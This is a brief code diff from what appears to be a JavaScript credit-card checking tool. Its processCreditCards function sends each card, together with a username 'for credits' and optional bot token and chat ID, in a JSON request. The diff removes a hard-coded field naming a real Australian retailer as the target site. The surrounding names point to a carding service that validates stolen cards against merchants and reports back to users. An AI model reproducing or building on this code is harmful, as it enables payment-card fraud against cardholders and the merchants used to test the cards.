@@ -260,7 +260,6 @@ async function processCreditCards(ccList) {
                 },
                 body: JSON.stringify({
                     cc: cc,
-                    site: 'buildersdiscountwarehouse.com.au',
                     username: username,     // User's username for credits
                     userBotToken: botToken, // User's bot token (optional)
                     userChatId: chatId      // User's chat ID (optional)
